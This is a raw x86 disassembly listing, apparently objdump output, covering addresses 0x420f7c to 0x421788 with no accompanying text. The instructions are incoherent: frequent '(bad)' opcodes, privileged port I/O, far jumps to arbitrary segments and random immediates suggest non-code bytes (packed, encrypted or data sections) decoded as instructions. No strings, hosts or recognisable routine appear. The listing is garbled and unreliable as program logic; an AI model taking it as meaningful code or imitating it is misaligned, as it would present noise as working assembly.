  420f7c:	sbb    DWORD PTR [eax+edx*2-0x4aed27c6],ecx
  420f83:	xchg   BYTE PTR [ecx],bl
  420f85:	pop    esi
  420f86:	sbb    BYTE PTR [ebp+0x6c],ch
  420f89:	hlt    
  420f8a:	inc    ecx
  420f8b:	mov    DWORD PTR [ebx+0x47],eax
  420f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f8f:	aaa    
  420f90:	mov    ds:0x23bbc3f6,eax
  420f95:	cdq    
  420f96:	jle    0x420f98
  420f98:	push   ss
  420f99:	outs   dx,BYTE PTR ds:[esi]
  420f9a:	test   al,0x24
  420f9c:	nop
  420f9d:	jae    0x420f7c
  420f9f:	cmp    dl,BYTE PTR [ebp+ecx*4-0x70]
  420fa3:	es out 0xae,al
  420fa6:	clc    
  420fa7:	push   ebp
  420fa8:	push   ds
  420fa9:	mov    dl,0x9c
  420fab:	lods   eax,DWORD PTR ds:[esi]
  420fac:	mov    bl,0x79
  420fae:	into   
  420faf:	push   edx
  420fb0:	push   esi
  420fb1:	push   ebx
  420fb2:	cmp    BYTE PTR [esi+eiz*4],ch
  420fb5:	pop    ebp
  420fb6:	es daa 
  420fb8:	and    cl,BYTE PTR [edi+0x7a]
  420fbb:	cli    
  420fbc:	std    
  420fbd:	out    0xd7,al
  420fbf:	(bad)  
  420fc0:	cmc    
  420fc1:	sbb    bl,BYTE PTR [eax]
  420fc3:	push   ds
  420fc4:	and    esp,DWORD PTR [ebx+0x26]
  420fc7:	mov    edi,0x320284b4
  420fcc:	push   ss
  420fcd:	arpl   di,bp
  420fcf:	cmc    
  420fd0:	loopne 0x420fc5
  420fd2:	xchg   edi,eax
  420fd3:	or     esi,DWORD PTR [edi+eax*2-0x29]
  420fd7:	std    
  420fd8:	retf   0x600b
  420fdb:	push   es
  420fdc:	mov    dl,cl
  420fde:	es mov cl,0x42
  420fe1:	pusha  
  420fe2:	pop    eax
  420fe3:	jmp    0x90d7:0x99a483b4
  420fea:	add    BYTE PTR [ebx+0x567bd53d],cl
  420ff0:	out    0x1a,al
  420ff2:	fild   WORD PTR ss:[ebp+0x67]
  420ff6:	xor    bh,0x71
  420ff9:	scas   al,BYTE PTR es:[edi]
  420ffa:	sub    edi,DWORD PTR [edi-0x6be259ac]
  421000:	inc    eax
  421001:	fstp   DWORD PTR [eax-0x45489b6f]
  421007:	out    dx,al
  421008:	test   eax,0x2276ac8e
  42100d:	or     cl,BYTE PTR [eax-0x97034be]
  421013:	add    eax,0xedb5ca79
  421018:	jmp    0x421020
  42101a:	sub    DWORD PTR [ebx-0x56],0xffffffd7
  42101e:	pop    esi
  42101f:	loop   0x421025
  421021:	pop    esp
  421022:	(bad)  
  421023:	sbb    ebx,DWORD PTR [eax-0x572d6748]
  421029:	mov    ecx,0xd8d53dad
  42102e:	xor    BYTE PTR [esi+0x2c83d28e],bl
  421034:	sbb    edi,DWORD PTR [ebp+edi*2-0x1d6d11a5]
  42103b:	add    DWORD PTR [ebp-0x9443f3f],0xfffffff8
  421042:	cmp    BYTE PTR [eax+0x35],0x31
  421046:	js     0x42107b
  421048:	jecxz  0x421016
  42104a:	aad    0xd4
  42104c:	jae    0x420ff1
  42104e:	xchg   ebx,eax
  42104f:	shl    al,1
  421051:	rol    DWORD PTR [eax-0x54],0xe0
  421055:	xchg   esi,eax
  421056:	xchg   edx,eax
  421057:	mov    eax,ds:0x758e3ece
  42105c:	test   BYTE PTR [ebx],ah
  42105e:	cmp    ah,BYTE PTR [edx]
  421060:	mov    esi,0xffdb1726
  421065:	pusha  
  421066:	test   al,0x92
  421068:	jmp    0x4210c4
  42106a:	outs   dx,DWORD PTR ds:[esi]
  42106b:	jbe    0x421059
  42106d:	scas   al,BYTE PTR es:[edi]
  42106e:	and    al,BYTE PTR [esp+ebx*4-0x798ee3c8]
  421075:	ja     0x4210cb
  421077:	out    dx,al
  421078:	push   edx
  421079:	test   bh,ah
  42107b:	pop    eax
  42107c:	push   esp
  42107d:	ror    DWORD PTR [eax+0x6c],0xcb
  421081:	pusha  
  421082:	neg    DWORD PTR [ecx+ecx*1-0x28]
  421086:	mov    al,0x19
  421088:	cmc    
  421089:	mov    al,0x1a
  42108b:	and    al,0xad
  42108d:	loop   0x42108a
	...
  421097:	add    BYTE PTR [eax],al
  421099:	add    BYTE PTR [edx+ecx*4-0x49],bl
  42109d:	imul   esi,edi,0x7f
  4210a0:	fdivr  QWORD PTR [edi+0x2b60ebfc]
  4210a6:	push   ecx
  4210a7:	add    al,0x99
  4210a9:	sbb    ecx,edi
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    ch,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR [edx+0x62],cl
  4210b4:	jle    0x42104f
  4210b6:	call   0x4570:0x21d8bffa
  4210bd:	xor    ebx,ebp
  4210bf:	popa   
  4210c0:	inc    ebx
  4210c1:	jmp    0x9910:0xcf882ee3
  4210c8:	mov    edi,0x1096c949
  4210cd:	add    BYTE PTR [ecx+0x3f3e7984],bl
  4210d3:	mov    edx,0x3b651162
  4210d8:	loopne 0x4210ab
  4210da:	daa    
  4210db:	mov    ah,0x68
  4210dd:	pop    ebx
  4210de:	pop    esi
  4210df:	add    BYTE PTR [ecx+0x28e308e2],dl
  4210e5:	test   eax,0xea4c7096
  4210ea:	lods   al,BYTE PTR ds:[esi]
  4210eb:	std    
  4210ec:	mov    ebp,gs
  4210ee:	sub    BYTE PTR [ecx-0x82fd85d],bl
  4210f4:	ror    BYTE PTR [ecx-0x44593679],1
  4210fa:	sub    esi,DWORD PTR [eax+0x72d47c86]
  421100:	fld    TBYTE PTR [ebp-0x20772a86]
  421106:	cli    
  421107:	sahf   
  421108:	iret   
  421109:	add    esi,edx
  42110b:	shr    BYTE PTR [esi+0x75],1
  42110e:	addr16 adc al,0x4e
  421111:	fadd   DWORD PTR [eax+ebp*1]
  421114:	es iret 
  421116:	inc    eax
  421117:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421118:	or     eax,0xec7bd9d2
  42111d:	adc    eax,0x6c607b40
  421122:	mov    ds:0x7ccded13,al
  421127:	xchg   DWORD PTR [ebx-0x46c37e36],ebx
  42112d:	push   ebx
  42112e:	cmp    al,0xd6
  421130:	mov    ds:0x4d2268d4,eax
  421135:	rcl    al,0x11
  421138:	aaa    
  421139:	ins    BYTE PTR es:[edi],dx
  42113a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42113b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42113c:	outs   dx,DWORD PTR cs:[esi]
  42113e:	fcom   QWORD PTR [eax-0x80]
  421141:	icebp  
  421142:	mov    edx,0x6026858a
  421147:	jo     0x4210da
  421149:	adc    al,BYTE PTR [edi-0x4e]
  42114c:	(bad)  
  42114d:	ror    edi,1
  42114f:	iret   
  421150:	and    DWORD PTR [edi],ecx
  421152:	xchg   edx,eax
  421153:	inc    ecx
  421154:	sahf   
  421155:	mov    BYTE PTR [edi+eiz*8+0x15],bl
  421159:	das    
  42115a:	ds mov ecx,0xfe82de84
  421160:	xchg   ebp,eax
  421161:	xchg   edx,eax
  421162:	je     0x4210f0
  421164:	inc    ebp
  421165:	add    al,0xf8
  421167:	pusha  
  421168:	hlt    
  421169:	mov    edi,0x811694d6
  42116e:	pop    esp
  42116f:	push   es
  421170:	pop    edx
  421171:	les    ebx,FWORD PTR [edx-0x28]
  421174:	loop   0x421102
  421176:	fild   QWORD PTR [edi]
  421178:	cmp    al,0x32
  42117a:	adc    BYTE PTR [edi],0x60
  42117d:	mov    cl,0x40
  42117f:	int3   
  421180:	fcom   st(3)
  421182:	sub    DWORD PTR [edx+0x63f2a7c6],edi
  421188:	add    BYTE PTR [ebp+0x79],bh
  42118b:	and    ebp,DWORD PTR [ebx]
  42118d:	push   edi
  42118e:	add    BYTE PTR [ebx+0x5ccbceaa],ch
  421194:	jmp    FWORD PTR [edi+0x45]
  421197:	(bad)  
  421198:	aam    0xb6
  42119a:	mov    esp,0x4587071b
  42119f:	jno    0x42114e
  4211a1:	scas   al,BYTE PTR es:[edi]
  4211a2:	mov    edi,0x94156aae
  4211a7:	sbb    DWORD PTR [ecx+0x6ac94743],ebx
  4211ad:	daa    
  4211ae:	add    cl,BYTE PTR [ebx+0x52]
  4211b1:	xchg   ebx,eax
  4211b2:	cs sbb eax,0x36dc67cc
  4211b8:	jl     0x42122f
  4211ba:	push   0x8927aef8
  4211bf:	inc    ebp
  4211c0:	inc    eax
  4211c1:	and    DWORD PTR ds:0xa2f61f38,ebx
  4211c7:	jge    0x421198
  4211c9:	pop    esp
  4211ca:	inc    ebp
  4211cb:	fwait
  4211cc:	xchg   edx,eax
  4211cd:	xor    ebx,DWORD PTR ds:0xcabcc7ae
  4211d3:	pop    ds
  4211d4:	jmp    0x3c0cf3af
  4211d9:	ins    BYTE PTR es:[edi],dx
  4211da:	inc    esp
  4211db:	hlt    
  4211dc:	leave  
  4211dd:	dec    edi
  4211de:	das    
  4211df:	imul   DWORD PTR [esi+eiz*2]
  4211e2:	jns    0x4211f6
  4211e4:	clc    
  4211e5:	inc    edi
  4211e6:	jmp    0x134d:0x91be8992
  4211ed:	and    BYTE PTR [ecx],bl
  4211ef:	data16 test al,0xee
  4211f2:	retf   
  4211f3:	push   ebp
  4211f4:	jb     0x4211b7
  4211f6:	mov    edx,0xb4835832
  4211fb:	test   al,0x1f
  4211fd:	sbb    al,BYTE PTR [edi-0x46863689]
  421203:	xchg   BYTE PTR [ecx-0x5a4f6e73],bl
  421209:	and    cl,ah
  42120b:	mov    DWORD PTR [ecx+0x394151f9],eax
  421211:	inc    eax
  421212:	dec    eax
  421214:	not    DWORD PTR ds:0x4d8a33b5
  42121a:	cmp    edx,edi
  42121c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42121d:	sub    eax,0xa2d8a3f8
  421222:	pop    edx
  421223:	and    BYTE PTR fs:[edi+0x79],0xfe
  421228:	dec    DWORD PTR [edx-0xd]
  42122b:	dec    ebp
  42122c:	punpckhdq mm5,QWORD PTR [edx+0x111ea91a]
  421233:	pop    edx
  421234:	fstp   TBYTE PTR [edi+esi*2+0x3c]
  421238:	das    
  421239:	mov    esi,0x8fc293a9
  42123e:	mov    ds:0x231dbdc4,al
  421243:	and    esi,DWORD PTR [ebp-0x115e462f]
  421249:	fs cli 
  42124b:	jmp    0x4ed1cbc
  421250:	pop    esp
  421251:	jns    0x4212ba
  421253:	or     DWORD PTR [ebx+0xf],0xcc617112
  42125a:	in     eax,dx
  42125b:	xor    eax,0x27c69bd7
  421260:	call   0xd71a6c81
  421265:	ins    DWORD PTR es:[edi],dx
  421266:	(bad)
  421269:	jp     0x42129b
  42126b:	cmp    ch,bh
  42126d:	stc    
  42126e:	or     dl,dh
  421270:	jno    0x4212df
  421272:	xchg   edi,eax
  421273:	ins    BYTE PTR es:[edi],dx
  421274:	shl    BYTE PTR [edi],1
  421276:	jp     0x421277
  421278:	scas   al,BYTE PTR es:[edi]
  421279:	pop    ebx
  42127a:	lahf   
  42127b:	les    ebp,FWORD PTR [ebx+ebp*1+0x8]
  42127f:	cwde   
  421280:	mov    ch,0x1e
  421282:	xchg   BYTE PTR fs:[edx+0x1bfcb4b2],ah
  421289:	retf   
  42128a:	stos   DWORD PTR es:[edi],eax
  42128b:	ret    0x4747
  42128e:	dec    edx
  42128f:	test   eax,0x71d3dfa8
  421294:	in     al,dx
  421295:	ret    0x9a8
  421298:	in     al,0x5f
  42129a:	xor    bh,BYTE PTR [ecx-0x388b7ec4]
  4212a0:	pop    esi
  4212a1:	jecxz  0x4212e4
  4212a3:	pop    eax
  4212a4:	dec    ebx
  4212a5:	fimul  DWORD PTR [eax]
  4212a7:	sub    DWORD PTR [ecx+0x17],0x39838657
  4212ae:	mov    ds:0x0,eax
  4212b3:	add    BYTE PTR [eax],al
  4212b5:	add    BYTE PTR [eax],al
  4212b7:	add    BYTE PTR [eax],al
  4212b9:	add    BYTE PTR [edi-0x402578e6],ah
  4212bf:	(bad)  
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx+0x7f767eaa]
  4212ca:	test   BYTE PTR [esi+0x1fd0001],0x0
  4212d1:	add    BYTE PTR [esp+edx*2],ch
  4212d4:	add    ecx,DWORD PTR [edi]
  4212d6:	inc    ebp
  4212d7:	pop    ecx
  4212d8:	sub    al,0x71
  4212da:	adc    edx,ebp
  4212dc:	stc    
  4212dd:	psrlq  mm4,mm6
  4212e0:	js     0x421328
  4212e2:	sbb    BYTE PTR [ebx-0x64],0x8f
  4212e6:	xor    eax,0x429046eb
  4212eb:	jb     0x4212c0
  4212ed:	mov    DWORD PTR [ebx+0x2d],ebp
  4212f0:	scas   al,BYTE PTR es:[edi]
  4212f1:	cmp    eax,0x8bd8241f
  4212f6:	jmp    0xb511:0x8c84b681
  4212fd:	fs pusha 
  4212ff:	add    eax,0x207c44a6
  421304:	cmc    
  421305:	aam    0x2f
  421307:	mov    edx,DWORD PTR [edx-0x7b]
  42130a:	aaa    
  42130b:	mov    bh,0x86
  42130d:	(bad)  
  42130e:	adc    al,0xd
  421310:	jle    0x4212f8
  421312:	lock xor al,0xc2
  421315:	(bad)  
  421316:	pushf  
  421317:	xchg   ebp,eax
  421318:	push   edi
  421319:	jno    0x42138e
  42131b:	jecxz  0x42134a
  42131d:	test   edx,esi
  42131f:	pop    esi
  421320:	inc    esi
  421321:	daa    
  421322:	and    DWORD PTR [ebp-0x617ce2b7],ecx
  421328:	pop    ebx
  421329:	in     al,0x1b
  42132b:	sub    dl,ch
  42132d:	xchg   ebx,eax
  42132e:	fimul  WORD PTR [edi+0x71df92d0]
  421334:	inc    ecx
  421335:	fidivr WORD PTR [ecx-0x38]
  421338:	ds xor al,0x22
  42133b:	mov    DWORD PTR [eax-0x526ead72],ebp
  421341:	pop    edi
  421342:	ret    
  421343:	enter  0xf29a,0xb7
  421347:	ret    0x113b
  42134a:	or     eax,DWORD PTR [ebp-0x77d538a3]
  421350:	aam    0x34
  421352:	arpl   WORD PTR [esp+edi*1],ax
  421355:	cld    
  421356:	mov    al,ds:0xe3545db8
  42135b:	xchg   ebx,eax
  42135c:	dec    edx
  42135d:	fistp  DWORD PTR [eax-0x41]
  421360:	mov    edx,0xe01b7048
  421365:	sub    ebp,esi
  421367:	pop    eax
  421368:	xlat   BYTE PTR ds:[ebx]
  421369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42136a:	bound  ebx,QWORD PTR fs:[ebp-0x2b1eed3b]
  421371:	imul   ecx,ecx,0xffffffd5
  421374:	sub    eax,0x4755d8fa
  421379:	jmp    0x4110c768
  42137e:	mov    ebx,0x5c21385f
  421383:	fcomp  DWORD PTR [ebx-0x4e]
  421386:	lahf   
  421387:	inc    esp
  421388:	xor    edx,ecx
  42138a:	and    ecx,0x30577e2f
  421390:	adc    eax,0x6ef42aad
  421395:	enter  0xc223,0x8d
  421399:	mov    dh,0x92
  42139b:	lea    eax,[ebx-0x80]
  42139e:	mov    ch,0x10
  4213a0:	mov    cl,0xc5
  4213a2:	ficomp DWORD PTR [edi]
  4213a4:	outs   dx,BYTE PTR ds:[esi]
  4213a5:	sub    al,0xea
  4213a7:	addr16 in al,0x68
  4213aa:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213ac:	mov    dh,0xe2
  4213ae:	dec    eax
  4213af:	popa   
  4213b0:	jo     0x42136b
  4213b2:	dec    esp
  4213b3:	push   ecx
  4213b4:	jmp    0xb2a868f0
  4213b9:	cmp    bl,BYTE PTR [ecx]
  4213bb:	jno    0x4213d5
  4213bd:	bound  edx,QWORD PTR [eax]
  4213bf:	push   esi
  4213c0:	(bad)  
  4213c1:	fisub  DWORD PTR [edi+0x310ae958]
  4213c7:	mov    ch,0x75
  4213c9:	ins    DWORD PTR es:[edi],dx
  4213ca:	dec    ebp
  4213cb:	sbb    al,0x4d
  4213cd:	aam    0x6f
  4213cf:	ds enter 0x4c63,0xbf
  4213d4:	mov    al,0x22
  4213d6:	shr    DWORD PTR [ebx],cl
  4213d8:	cmp    DWORD PTR [edx*4+0x64e297e3],esp
  4213df:	and    dl,BYTE PTR [ebp+0xf542a40]
  4213e5:	inc    ebx
  4213e6:	push   ebx
  4213e7:	inc    edi
  4213e8:	xor    ebx,DWORD PTR [eax+0x2a]
  4213eb:	rol    esi,cl
  4213ed:	xchg   ecx,eax
  4213ee:	or     al,0x4d
  4213f0:	xor    dl,BYTE PTR [ebx-0x7565b8a]
  4213f6:	jns    0x4213bd
  4213f8:	push   edx
  4213f9:	das    
  4213fa:	repnz pusha 
  4213fc:	dec    esp
  4213fd:	shl    DWORD PTR [eax-0xf3bc5fc],0xbc
  421404:	xchg   dx,ax
  421406:	mov    ch,0xd1
  421408:	test   eax,0xe5ef331f
  42140d:	lock out dx,eax
  42140f:	hlt    
  421410:	jecxz  0x421403
  421412:	cmp    al,BYTE PTR [ecx-0x77]
  421415:	sub    eax,DWORD PTR [ecx+edi*2]
  421418:	inc    esp
  421419:	clc    
  42141a:	(bad)  
  42141c:	cmp    BYTE PTR ds:0x69a84a2,ah
  421422:	xor    DWORD PTR [esi*1-0x4e2887af],esi
  421429:	push   edx
  42142a:	or     ecx,ebp
  42142c:	mov    bl,0xb
  42142e:	add    BYTE PTR [edi+0x506b67f],al
  421434:	adc    ebp,DWORD PTR [ebp+0x4bc68e8]
  42143a:	call   0x54433733
  42143f:	out    dx,eax
  421440:	shr    DWORD PTR ds:0xe9c73dea,0x62
  421447:	sbb    ch,BYTE PTR [edi-0x731c5087]
  42144d:	sahf   
  42144e:	dec    esi
  42144f:	call   0x57873165
  421454:	int    0x56
  421456:	pop    edi
  421457:	inc    edi
  421458:	lds    ebx,FWORD PTR [esi]
  42145a:	mov    eax,ds:0xcb40f0e2
  42145f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421460:	jb     0x4214bd
  421462:	xchg   esp,eax
  421463:	(bad)  
  421464:	mov    gs,WORD PTR [eax+0x1aa66f3f]
  42146a:	or     eax,0xdb487f3e
  42146f:	sbb    ebp,DWORD PTR [ecx+0xd]
  421472:	sbb    al,0x37
  421474:	dec    ecx
  421475:	leave  
  421476:	call   0x2b1505dd
  42147b:	inc    ecx
  42147c:	sbb    al,bl
  42147e:	mov    edx,0xd824bbab
  421483:	xchg   DWORD PTR [eax+ebx*8-0x5d5530e2],edi
  42148a:	imul   ebp,ebp,0x5ab08eb2
  421490:	mov    ebx,DWORD PTR [edx]
  421492:	out    0x84,eax
  421494:	xchg   edx,eax
  421495:	pop    esp
  421496:	dec    edi
  421497:	outs   dx,DWORD PTR ds:[esi]
  421498:	test   ch,al
  42149a:	push   0x781fdcc1
  42149f:	cwde   
  4214a0:	retf   0x79ae
  4214a3:	push   edi
  4214a4:	and    eax,0x58361286
  4214a9:	cdq    
  4214aa:	sar    DWORD PTR [ebp+0x2a5268ce],1
  4214b0:	fcom   DWORD PTR [bp+di+0x1ec2]
  4214b5:	inc    BYTE PTR [edi-0x6]
  4214b8:	in     al,dx
  4214b9:	push   ebp
  4214ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214bb:	inc    esi
  4214bc:	repz mov ebx,0xcff3be86
  4214c2:	fwait
  4214c3:	loopne 0x421536
  4214c5:	lods   eax,DWORD PTR ds:[esi]
  4214c6:	ror    DWORD PTR [eax-0x4d],0xe4
  4214ca:	mov    bh,0x5f
  4214cc:	daa    
  4214cd:	leave  
  4214ce:	push   ebp
	...
  4214d7:	add    BYTE PTR [eax],al
  4214d9:	add    BYTE PTR [ebp-0x15b01f1],bl
  4214df:	cmc    
  4214e0:	fistp  QWORD PTR [edi]
  4214e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	rol    DWORD PTR [edi],0xe3
  4214e9:	xchg   esi,eax
  4214ea:	pause  
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	std    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    bl,al
  4214f3:	push   esi
  4214f4:	push   edx
  4214f5:	into   
  4214f6:	bound  ebp,QWORD PTR [ebx]
  4214f8:	inc    ebx
  4214f9:	aam    0x1c
  4214fb:	sbb    eax,0xdcd7f3aa
  421500:	inc    ecx
  421501:	sub    DWORD PTR [di+0x20e5],0xffffffab
  421507:	fnsave [ebp-0x1b]
  42150a:	pop    esp
  42150b:	pop    eax
  42150c:	pop    ebx
  42150d:	adc    DWORD PTR [esi-0x7f],edx
  421510:	aaa    
  421511:	xchg   ebp,eax
  421512:	pop    esi
  421513:	mov    edi,0x6c2d00c2
  421518:	cmp    esi,DWORD PTR [ebx-0x72a9227f]
  42151e:	mov    ecx,0xbcf3affe
  421523:	xlat   BYTE PTR ds:[ebx]
  421524:	cmp    eax,0x4082f015
  421529:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42152a:	sbb    eax,0xf11c570e
  42152f:	add    ebx,DWORD PTR [ecx]
  421531:	mov    eax,ds:0x17493d47
  421536:	mov    ebx,0xc2691dac
  42153b:	repz xor BYTE PTR [edx-0x15],0xf8
  421540:	sbb    ecx,DWORD PTR [ebp+0x1]
  421543:	ins    BYTE PTR es:[edi],dx
  421544:	ins    DWORD PTR es:[edi],dx
  421545:	std    
  421546:	lods   eax,DWORD PTR ds:[esi]
  421547:	jns    0x4215c3
  421549:	xchg   edx,eax
  42154a:	ja     0x42155e
  42154c:	int    0x3d
  42154e:	(bad)  
  42154f:	sbb    ecx,DWORD PTR [ebp+0x792f13a]
  421555:	dec    ecx
  421556:	call   0xa69d245
  42155b:	vpsubb xmm4,xmm6,XMMWORD PTR [ebx]
  42155f:	cmp    DWORD PTR [edx-0x7bcfc854],esi
  421565:	mov    dh,0xd3
  421567:	inc    ebx
  421568:	pushf  
  421569:	sbb    bl,dl
  42156b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42156c:	jmp    0x13b1aa62
  421571:	adc    BYTE PTR [esi+ebx*2-0x48fbbc98],dh
  421578:	push   ebx
  421579:	push   ebp
  42157a:	inc    ecx
  42157b:	in     al,dx
  42157c:	cmc    
  42157d:	xchg   ecx,eax
  42157e:	adc    eax,0x5c3f5403
  421583:	retf   
  421584:	sbb    BYTE PTR [ebp-0x22],0x4c
  421588:	out    dx,al
  421589:	mov    al,ds:0x66569556
  42158e:	ins    DWORD PTR es:[edi],dx
  42158f:	pop    ds
  421590:	pop    edx
  421591:	push   ds
  421592:	iret   
  421593:	cmp    esi,esp
  421595:	icebp  
  421596:	xor    edx,0xffffffff
  421599:	int3   
  42159a:	jno    0x4215bf
  42159c:	idiv   BYTE PTR [ecx+0x608721ea]
  4215a2:	push   cs
  4215a3:	mov    edx,0xd8113257
  4215a8:	fwait
  4215a9:	jae    0x421594
  4215ab:	cdq    
  4215ac:	mov    ds:0x4b0dff17,al
  4215b1:	cmp    DWORD PTR [ebp-0x73a4330c],ebx
  4215b7:	arpl   WORD PTR es:[eax-0x19],ax
  4215bb:	push   esi
  4215bc:	not    DWORD PTR [esp+edi*1+0x12a046fe]
  4215c3:	push   ss
  4215c4:	push   edi
  4215c5:	lock sbb BYTE PTR [ebx],ch
  4215c8:	call   0xe1a6e4ca
  4215cd:	dec    esi
  4215ce:	imul   esp,DWORD PTR [esi],0x75
  4215d1:	lds    esp,FWORD PTR [edi]
  4215d3:	xor    eax,0x33e6c2dc
  4215d8:	add    BYTE PTR [ebp-0x2a],al
  4215db:	xchg   ecx,eax
  4215dc:	push   0xdd8ef3
  4215e1:	out    dx,eax
  4215e2:	ds lock sar dl,0x6d
  4215e7:	call   0xc4d289d0
  4215ec:	inc    ebp
  4215ed:	(bad)  
  4215ee:	iret   
  4215ef:	pop    es
  4215f0:	push   0x52
  4215f2:	imul   edi,DWORD PTR [esp+eiz*8+0x18],0x64
  4215f7:	in     al,dx
  4215f8:	mov    ch,0x40
  4215fa:	adc    edi,DWORD PTR [esi-0x41323bba]
  421600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421601:	push   cs
  421602:	bnd jno 0x4215ec
  421605:	cmp    ax,0x6fbc
  421609:	mov    edi,0x47722bff
  42160e:	and    eax,0xaa7e7cfd
  421613:	push   eax
  421614:	fdivr  QWORD PTR [esp+ecx*2+0x3a0947f6]
  42161b:	sar    BYTE PTR [esi+eax*2-0x5126dc89],1
  421622:	gs loopne 0x4215ef
  421625:	mov    eax,ds:0x14f56442
  42162a:	stos   DWORD PTR es:[edi],eax
  42162b:	popa   
  42162c:	xchg   esp,eax
  42162d:	call   0x5085:0xd3195eb6
  421634:	xchg   edx,eax
  421635:	xchg   ebx,eax
  421636:	sub    eax,0x3140babc
  42163b:	mov    edi,0xab0dca89
  421640:	(bad)  
  421641:	jge    0x42161c
  421643:	cmp    bl,BYTE PTR [eax]
  421645:	adc    eax,0x5ee72228
  42164a:	fsub   DWORD PTR [esi]
  42164c:	lods   eax,DWORD PTR ds:[esi]
  42164d:	in     eax,dx
  42164e:	or     dl,BYTE PTR [ecx]
  421650:	fwait
  421651:	gs test al,0xcb
  421654:	cdq    
  421655:	xor    cl,BYTE PTR [esi*4+0x144ec68b]
  42165c:	ins    BYTE PTR es:[edi],dx
  42165d:	push   esi
  42165e:	es dec ebx
  421660:	or     BYTE PTR [ebp-0x4d14c540],bl
  421666:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421667:	push   ebp
  421668:	jg     0x4216d2
  42166a:	cs sbb eax,0xc27d6429
  421670:	ja     0x421682
  421672:	xor    DWORD PTR [eax],esi
  421674:	lds    ebp,FWORD PTR [ebp+0x37]
  421677:	fwait
  421678:	push   cs
  421679:	aam    0x59
  42167b:	jecxz  0x4216f8
  42167d:	add    BYTE PTR [ebp+0x79],dl
  421680:	mov    cl,0x7
  421682:	xchg   edi,eax
  421683:	scas   al,BYTE PTR es:[edi]
  421684:	dec    edi
  421685:	sahf   
  421686:	cmp    al,0x6d
  421688:	add    cl,dl
  42168a:	inc    edx
  42168b:	cmp    ebp,ecx
  42168d:	push   edi
  42168e:	aaa    
  42168f:	mov    ds:0x5185aba5,al
  421694:	in     eax,0xbf
  421696:	add    al,0x27
  421699:	test   al,0x7f
  42169b:	stos   BYTE PTR es:[edi],al
  42169c:	inc    ebx
  42169d:	jbe    0x4216a2
  42169f:	push   0x56
  4216a1:	imul   DWORD PTR [ebp+0x35]
  4216a4:	fwait
  4216a5:	js     0x4216b4
  4216a7:	in     eax,0x52
  4216a9:	mov    al,es:0x65c28d5b
  4216af:	clc    
  4216b0:	scas   eax,DWORD PTR es:[edi]
  4216b1:	fsub   DWORD PTR [esi-0x59]
  4216b4:	pop    ecx
  4216b5:	(bad)
  4216b8:	mov    BYTE PTR [edi],0x91
  4216bb:	call   0x5100:0xf29e3450
  4216c2:	push   0xe
  4216c4:	outs   dx,DWORD PTR ds:[esi]
  4216c5:	psraw  mm4,QWORD PTR [esi-0x7d91a9e9]
  4216cc:	adc    eax,0xd753677a
  4216d1:	dec    ebx
  4216d2:	aad    0xb7
  4216d4:	mov    edx,0xdbf8489b
  4216d9:	xlat   BYTE PTR ds:[ebx]
  4216da:	mul    BYTE PTR [ebx]
  4216dc:	test   DWORD PTR [edi+0x72],esp
  4216df:	dec    ecx
  4216e0:	pop    edx
  4216e1:	inc    ebp
  4216e2:	pushf  
  4216e3:	das    
  4216e4:	pop    edx
  4216e5:	jns    0x421727
  4216e7:	imul   ecx,DWORD PTR [ebp+0x1856c01b],0xd9d
	...
  4216f9:	add    BYTE PTR [eax],ah
  4216fb:	push   ss
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	test   cl,0x50
  421708:	pop    esp
  421709:	mov    al,0xf0
  42170b:	xchg   edx,eax
  42170c:	add    DWORD PTR [eax],eax
  42170e:	std    
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    BYTE PTR [esi-0x373f1059],al
  421717:	out    0x3a,al
  421719:	dec    ecx
  42171a:	sbb    BYTE PTR ds:0xa8571deb,ch
  421720:	mov    dl,0x4f
  421722:	add    al,0xb6
  421724:	jge    0x421731
  421726:	or     al,ah
  421728:	cmp    BYTE PTR [edi],bh
  42172a:	inc    esp
  42172b:	xor    DWORD PTR [ecx+0x8],edi
  42172e:	xchg   edi,eax
  42172f:	mov    esp,0xf1a152e0
  421734:	fdiv   DWORD PTR [ecx+0x50]
  421737:	call   FWORD PTR [eax+0x32189cf5]
  42173d:	shl    DWORD PTR [edi-0xa],cl
  421740:	jns    0x421728
  421742:	xor    DWORD PTR [ecx-0xcca09f7],0x56
  421749:	add    BYTE PTR [esp+edx*4+0x4c],cl
  42174d:	cld    
  42174e:	push   edi
  42174f:	mov    ebx,0x18434000
  421754:	lock cmp al,0x9d
  421757:	daa    
  421758:	(bad)  
  421759:	jno    0x4216e5
  42175b:	(bad)  
  42175c:	idiv   BYTE PTR [edi+0x66]
  42175f:	add    al,0x8a
  421761:	and    ebp,edx
  421763:	(bad)  
  421764:	repz jbe 0x4217b0
  421767:	or     BYTE PTR [esi+eiz*1-0x6a26794],bl
  42176e:	popf   
  42176f:	dec    ebp
  421770:	lods   eax,DWORD PTR ds:[esi]
  421771:	test   al,0x7e
  421773:	jge    0x42171a
  421775:	mov    eax,ds:0x58480395
  42177a:	jne    0x421777
  42177c:	xchg   ebp,eax
  42177d:	xor    al,0x70
  42177f:	mov    ah,0x27
  421781:	out    0x34,al
  421783:	dec    esp
  421784:	add    bh,cl
  421786:	or     al,0x5e
  421788:	clc    
